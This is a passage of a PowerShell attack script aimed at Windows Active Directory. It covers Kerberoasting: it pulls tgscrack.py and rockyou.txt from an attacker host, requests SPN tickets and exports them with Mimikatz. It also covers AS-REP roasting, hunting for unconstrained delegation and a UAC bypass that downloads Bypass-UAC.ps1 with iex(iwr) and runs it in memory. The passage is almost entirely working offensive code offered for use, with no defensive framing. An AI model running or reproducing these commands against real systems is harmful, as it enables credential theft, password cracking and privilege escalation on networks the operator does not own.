    write-host -foregroundcolor yellow -backgroundcolor black "Make sure you have tgscrack.py and a web server started on $AttackerIP"
	start-sleep -seconds 5
	write-host -foregroundcolor yellow -backgroundcolor black "Downloading tgscrack.py"
	wget -usebasicparsing http://$AttackerIP/tgscrack.py -outfile C:\Windows\Temp\tgscrack.py
	write-host -foregroundcolor yellow -backgroundcolor black "Getting Net User SPN"
	start-sleep -seconds 1
	get-netuser -SPN
	start-sleep -seconds 3
	write-host -foregroundcolor yellow -backgroundcolor black "Requesting SPN Ticket"
	Request-SPNTicket
	start-sleep -seconds 3
	Invoke-Mimikatz -command '"kerberos::list /export"'
	$File_Name = Read-Host -Prompt 'Need Kirbi file name, copy the whole thing with .kirbi at the end'
	}
	elseif ($confirmation -eq 'N')
	{'Need Python, sorry'}
	else {}
	$confirmation = Read-Host -Prompt "Do you have a password list, if not will download from $AttackerIP and download rockyou.txt, would need web server on /usr/share/wordlists (Y/N)?"
      if ($confirmation -eq 'Y')
      {
	$Password_List_Location = Read-Host -Prompt 'Password list location'
	$Password_List_Name = Read-Host -Prompt 'Password list name'
	python C:\windows\temp\tgscrack.py $Password_List_Location\$Password_List_Name $File_Name
		}
	elseif ($confirmation -eq 'N')
	{
		write-host -foregroundcolor yellow -backgroundcolor black "Make sure web server is started on $AttackerIP in /usr/share/wordlists directory"
		wget -usebasicparsing http://$AttackerIP/rockyou.txt -outfile C:\Windows\Temp\rockyou.txt
		python C:\windows\temp\tgscrack.py C:\Windows\Temp\rockyou.txt $File_Name
	}
	else {}
}
Function AsRep
{
		write-host -foregroundcolor yellow -backgroundcolor black "For this you will need ASREPRoast-master.zip"
		expand-archive .\ASREPRoast-master.zip
		cd ASREPRoast-master; cd ASREPRoast-master
		. .\asreproast.ps1
		get-domainuser -preauthnotrequired
		start-sleep -seconds 3
		invoke-asreproast
		start-sleep -seconds 3
		$User = Read-Host -Prompt 'Which user is AsRepRoastable'
		Get-AsRepRoast -username $User -verbose
		write-host -foregroundcolor yellow -backgroundcolor black "Crack hash offline with john the ripper"
}
Function Delegation
{
	get-netcomputer -unconstrained
	start-sleep -seconds 5
	$delegation = Read-Host -Prompt "Which machine does user have unconstrained delegation to"
	$sess = new-pssession -computername $delegation
	$sess = enter-pssession -session $sess
}

Function BypassUAC
{
	write-host -foregroundcolor yellow -backgroundcolor black "Putting BypassUAC.ps1 into memory"
	iex (iwr https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Bypass-UAC/Bypass-UAC.ps1)
	Bypass-UAC -Method ucmDismMethod
}	
